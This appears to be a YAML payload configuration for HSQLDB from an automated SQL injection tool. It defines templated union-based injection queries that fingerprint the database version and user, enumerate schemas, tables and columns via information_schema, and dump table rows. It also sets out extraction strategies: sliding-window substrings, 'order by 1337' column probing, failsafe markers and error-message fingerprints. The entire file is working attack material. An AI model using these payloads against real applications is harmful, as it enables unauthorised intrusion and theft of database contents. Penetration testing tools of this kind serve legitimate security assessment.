vendor: HSQLDB
# jdbc:hsqldb:hsql://127.0.0.1:9001/mainDb
# sa

resource:
 info: |
  select concat(
      concat_ws(
          '${enclose_value_sql}',
          database_version(),
          current_schema,
          user()
      ),
      '${trail_sql}'
  ) r
  from (
      values(0)
  )

 schema:
  database: |
   select concat(
       group_concat(
           '${enclose_value_sql}'
           || r
           || '${separator_qte_sql}'
           || convert(q, sql_varchar)
           || '${enclose_value_sql}'
           order by r
           separator '${separator_cell_sql}'
       ),
       '${trail_sql}'
   ) r
   from (
       select
           convert(schema_name, sql_varchar) r,
           count(table_name) q
       from information_schema.tables t
       right join information_schema.schemata s
       on t.table_schema = s.schema_name
       group by r
       ${limit}
   ) x

  table: |
   select concat(
       group_concat(
           '${enclose_value_sql}'
           || convert(r, sql_varchar)
           || '${separator_qte_sql}0${enclose_value_sql}'
           order by r
           separator '${separator_cell_sql}'
       ),
       '${trail_sql}'
   ) r
   from (
       select table_name r
       from information_schema.tables
       where table_schema = '${database}'
       order by r
       ${limit}
   ) x

  column: |
   select concat(
       group_concat(
           '${enclose_value_sql}'
           || convert(n,sql_varchar)
           || '${separator_qte_sql}'
           || 0
           || '${enclose_value_sql}'
           order by n
           separator '${separator_cell_sql}'
       ),
       '${trail_sql}'
   ) r
   from (
       select column_name n
       from information_schema.columns
       where table_schema = '${database}'
       and table_name = '${table}'
       order by n
       ${limit}
   ) x

  row:
   query: |
    select concat(
        group_concat(
            '${enclose_value_sql}'
            || r
            || '${separator_qte_sql}'
            || convert(q,sql_varchar)
            || '${enclose_value_sql}'
            order by r
            separator '${separator_cell_sql}'
        ),
        '${trail_sql}'
    ) r
    from (
        select
            convert(${fields}, sql_varchar) r,
            count(*) q
        from ${database}.${table}
        group by r
        ${limit}
    ) x
   fields:
    field: trim(ifnull(convert(${field.value}, sql_varchar), ''))
    concat: "|| '%7f' ||"

strategy:
 configuration:
  slidingWindow: |
   select
       '${lead}'
       || substr(
           r,
           ${window.char},
           /**
            * Minus '${lead}' should apply
            */
           ${capacity}
       )
   from (
       ${injection}
   ) x
  limit: limit ${limit.value}, 65536
  failsafe: |
   select
       (1337${indice}7330%2b1)
       || '' r
   from (values(0))
  calibrator: repeat('${calibrator_sql}', 1024)
  limitBoundary: 0
  endingComment: --+-
  fingerprint:
   errorMessage:
    - HSQLDB
   orderByErrorMessage:
    - invalid ORDER BY expression

 normal:
  indices: union select ${result_range} from (${indice_unique}) b
  capacity: ('${lead}' || ${indice} || ${calibrator})
  orderBy: order by 1337